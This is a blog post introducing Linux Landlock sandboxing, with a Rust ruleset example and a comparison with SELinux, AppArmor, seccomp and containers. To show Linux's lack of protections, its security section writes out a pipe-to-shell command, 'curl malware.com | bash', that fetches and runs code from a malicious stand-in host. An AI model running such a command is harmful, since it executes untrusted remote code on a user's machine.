+++
date = '2025-11-29T15:30:30-05:00'
draft = false
title = 'Landlock: a cool linux sandboxing feature'
type = 'post'
description = 'Why you should consider using landlock'
+++

# Landlock: What is landlock?

You can think of landlock as an linux API to explicitly declare what resources a program is allowed to access. It's
similar in a lot of ways to the philosophy of OpenBSD's acclaimed `unveil` and `pledge` syscalls, where programs can
make a contract with the kernel declaring: I only need these files/access to these resources, so you can deny me access
to everything else in case I get comprimised. 

It's an easy way to add defense in depth to your applications, and compared to other linux security mechanisms, it's
much easier to grasp.

I'm making this post as an accessible introduction to landlock, and I'm going to try to convince you to give it a try.

# How does it work? What can it do?

Landlock is a LSM (linux security module) present from linux 5.13. Unlike the MAC LSMs, landlock provides transient
restrictions on linux resources that begin once the policy is enforced, and cease to exist once the program exits.

You cannot "tag" files or directories with extended attributes like selinux or apparmor. Instead, the policy is
created at runtime.

Landlock policies consist of two main parts:
1. handled accesses (the categories of access the policy applies to)
2. access grants (an explicit allowlist of which rights the objects recieve)

For example a landlock policy could be:
1. I want to handle all this program's filesystem reads and writes, and what ports it can bind to.
2. This program can read /home/user and can read and write to /tmp, and can bind to port 2222.


The program can then create this policy and call `landlock_restrict_self` to irrevocably restrict the current thread
to the allowed access rights. Restrictions apply to all child threads, and if the program is in a cgroup, all processes
in the "domain" will also be restricted. Restrictions cannot be revoked, and are immutable for the life of the domain.


Landlock policies can be layered (up to 16 layers). But layers cannot grant access rights not present in parent layers,
meaning once a process is restricted, you can only restrict the process more.

For the above policy, if a program tries to read /etc/passd or bind to 8080, it will be denied. But a child thread could
make another policy layer saying: "I can only read from /home/user." because this right was granted by the previous layer.
Then the program could no longer bind to 2222.

Landlock is implemented in the kernel itself in the linux syscall interface, and can be used by unprivileged processes.
It uses a deny-by-default paradigm, and is under active development and has a lot of work going into it on the kernel
mailing list. It has some limitations, but ongoing work is underway to add more features.

Landlock also has strong backward compatibility, and because it has ABI versioning, its easy for developers to write
programs that will apply best-effort restrictions on older kernels that don't have the latest ABI features.

# Why should you use it?

Landlock is especially great if you know your program is only going to need access to certain files. For example, you
could easily make a policy for nginx to restrict access to only the /var/www/html directory.

Right now, landlock is easiest to use by the application developers themselves. Rather than slapping a policy on 
(apparmor or selinux style) the developer themselves can hardcode this in their application source code.

Because it doesn't require privileges to load a policy, its pretty trivial to add to most programs.

In rust, you can use it like this:

```rust
use landlock::{
    ABI, Access, AccessFs, Ruleset, RulesetAttr, RulesetCreatedAttr, RulesetStatus, RulesetError,
    path_beneath_rules,
};

fn restrict_thread() -> Result<(), RulesetError> {
    let abi = ABI::V1;
    let status = Ruleset::default()
        .handle_access(AccessFs::from_all(abi))?
        .create()?
        // Read-only access to /usr, /etc and /dev.
        .add_rules(path_beneath_rules(&["/usr", "/etc", "/dev"], AccessFs::from_read(abi)))?
        // Read-write access to /home and /tmp.
        .add_rules(path_beneath_rules(&["/home", "/tmp"], AccessFs::from_all(abi)))?
        .restrict_self()?;
    match status.ruleset {
        // The FullyEnforced case must be tested by the developer.
        RulesetStatus::FullyEnforced => println!("Fully sandboxed."),
        RulesetStatus::PartiallyEnforced => println!("Partially sandboxed."),
        // Users should be warned that they are not protected.
        RulesetStatus::NotEnforced => println!("Not sandboxed! Please update your kernel."),
    }
    Ok(())
}
```

Other libraries for haskell and go exist, and there are a couple `unveil` clones out there than replicate
the openbsd syscall's functionality. 

# State of linux sandboxing: Why should you care

With the increased adoption of linux on the desktop, more and more malware is beginning to target
desktop users. While linux desktop users have enjoyed a relative island of safety, protected in
some part by their small market share and a higher barrier of entry relative to Windows, much
work still needs to be done to bring linux up to the state of the art.

I love linux, and use it as my daily driver. But linux is not a security pancea.

For example:

  * Linux lacks protections against executing untrusted code. On almost every major linux distribution,
    out of the box I can:
    * curl a script from the internet into my shell `curl malware.com | bash`, with no prompt warning
      me of the risks.
    * execute untrusted executables outside my package manager downloaded from the internet.
    * If I have passwordless sudo, execute any command as the root user.
  * By default, most programs running unprivileged in a normal user session:
    * May access ~/.ssh, ~/.bashrc, and everything in the home directory.
    * Overwrite the path and sensitive environment variables
    * Create new systemd --user services
    * (on x11) log keystrokes and read sensitive input devices.
    * bind to network ports.

Solutions exist to mitigate some of these problems, to varying degrees of success. 

Here's a quick overview of the user facing options you see many apps using:
  * docker, podman, and other containerization tools: While these are great for providing isolation of
    server-style applications, they lack the ergonomics to be used for many CLI and desktop applications,
    * Accessing a user's home files requires an explicit volume mount, or mounting the entire home directory.
    * Containerizing desktop applications is even harder, usually these tools aren't designed for it.
    * A lot of users will use things like --network host or --privileged, which breaks a lot of the containerization
      benefits.
  * flatpak and snap: Great for typical desktop applications (flatpak moreso than snap), but they often require
    overbroad grants (how many apps need snap --classic?) and don't work well for cli tools.
  * firejail: Requires generating bespoke application profiles for each service, and explicity invoking the tool
    with firejail or making a wrapper.

From a developer side, we have a couple tools in our toolbox:
  * seccomp: Syscall-filtering framework. It's a powerful tool, but blocking every single syscall except the ones you
    need is tedious and error-prone. And blacklisting syscalls equally error prone and future updates adding new syscalls
    may break containerization
    * filtering individual syscall arguments is extremely tricky, and frought with TOCTOU landminds.
  * selinux: MAC framework for linux. It's a powerful tool, but underused and requires making system wide policies. It
    has a steep learning curve. Many forums and online resources just suggest disabling it (setenforce 0) rather than
    deal with debugging the profiles themselves.
  * apparmor: Another MAC framework. A little easier to use than selinux, but again suffers from a high skill ceiling.
    It again is designed to be used with root/admin configured policies and it applies MAC systemwide, with no ability
    to "namespace" turning this feature on/off for specific processes or cgroups.
  * landlock: the new kid on the block.

I think that the general problem with many of these LSMs is they are a pain in the ass to use. Landlock isn't perfect and
a lot of work is still ongoing, but I think it may be one of the most important LSMs to take off and see widespread
adoption in the desktop space.

# Ongoing work in landlock

Landlock has a few interesting pending proposals:

   * [Supervise mode](https://marc.info/?l=linux-fsdevel&m=174105064226536&w=2): Proposal for the ability for userspace "supervisors" to monitor sandboxed processes and
     interactively deny / allow access to certain resouces. This would be huge and (in my humble opinion) have the potential to bring android-like interative permissions
     to the linux desktop.
   * [Socket restrictions](https://github.com/landlock-lsm/linux/issues/6) : Controlling access to various types of sockets.
   * [LANDLOCK_RESTRICT_SELF_TSYNC](https://lore.kernel.org/all/20250221184417.27954-2-gnoack3000@gmail.com/): Syncing policies to all process threads
   * [LANDLOCK_ADD_RULE_QUIET](https://lore.kernel.org/linux-security-module/cover.1763931318.git.m@maowtm.org/T/#t): Allows suppressing which objects trigger an audit message.
   * [(disclosure: this is my patch series) LANDLOCK_ADD_RULE_NO_INHERIT](https://lore.kernel.org/linux-security-module/20251126122039.3832162-1-utilityemal77@gmail.com/T/#t):
     Stops access grants from inheriting from parent directories, so you can have finer grained access controls on the filesystem. 

# tldr;

Landlock is a cool security mechanism for linux, you should be excited about it.

It's pretty easy to grasp and has a lot of potential. 

Give it a try in your application.